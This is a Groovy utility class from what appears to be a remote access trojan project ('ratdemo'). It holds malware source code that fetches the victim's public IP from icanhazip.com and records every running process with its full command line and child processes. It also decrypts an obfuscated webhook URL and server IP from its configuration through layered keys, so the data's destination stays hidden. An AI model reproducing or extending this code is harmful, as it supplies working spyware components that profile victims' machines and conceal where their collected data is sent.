package de.tudbut.ttd.ratdemo

import tudbut.net.http.HTTPRequest
import tudbut.net.http.HTTPRequestType
import tudbut.parsing.TCN
import tudbut.parsing.TCNArray
import tudbut.tools.encryption.Key
import tudbut.tools.encryption.RawKey

class Util {

    static String getIP() {
        InetSocketAddress address = new InetSocketAddress(getIPv6(), 0)
        return new InetSocketAddress(address.hostName, 0).hostString
    }

    static String getIPv6() {
        HTTPRequest request = new HTTPRequest(HTTPRequestType.GET, 'icanhazip.com', 80, '/')
        return request.send().parse().body.split('\n')[0]
    }

    static TCN processToTCN(ProcessHandle it, Long[] pidsDone) {
        TCN process = new TCN()
        pidsDone += it.pid()
        ProcessHandle.Info info = it.info()
        if (info.command().present)
            process.set('file', info.command().get())
        if (info.commandLine().present)
            process.set('command', info.commandLine().get())
        ProcessHandle[] children = it.children().collect { it }
        TCN childrenArray = new TCN()
        children.collect {
            childrenArray.set(it.pid() as String, processToTCN(it, pidsDone))
        }
        process.set('children', childrenArray)
        return process
    }

    static void deobf(TCN config) {
        TCNArray obf = config.getArray("obfuscation")
        if(config.get("webhook") != null) {
            obf.getArray(1).collect {
                Key key = new RawKey(obf.getArray(0).getString((it as TCNArray).getInteger(0)))
                boolean b = (it as TCNArray).getBoolean(1)
                if(Main.debug)
                    println "Deobf: $key $it"
                if(b)
                    config.set("webhook", key.decryptString(config.getString("webhook")))
                else
                    config.set("webhook", key.encryptString(config.getString("webhook")))
            }
        }
        if(config.get("ip") != null) {
            obf.getArray(1).collect {
                Key key = new RawKey(obf.getArray(0).getString((it as TCNArray).getInteger(0)))
                boolean b = (it as TCNArray).getBoolean(1)
                if(Main.debug)
                    println "Deobf: $key $it"
                if(b)
                    config.set("ip", key.decryptString(config.getString("ip")))
                else
                    config.set("ip", key.encryptString(config.getString("ip")))
            }
        }
    }
}
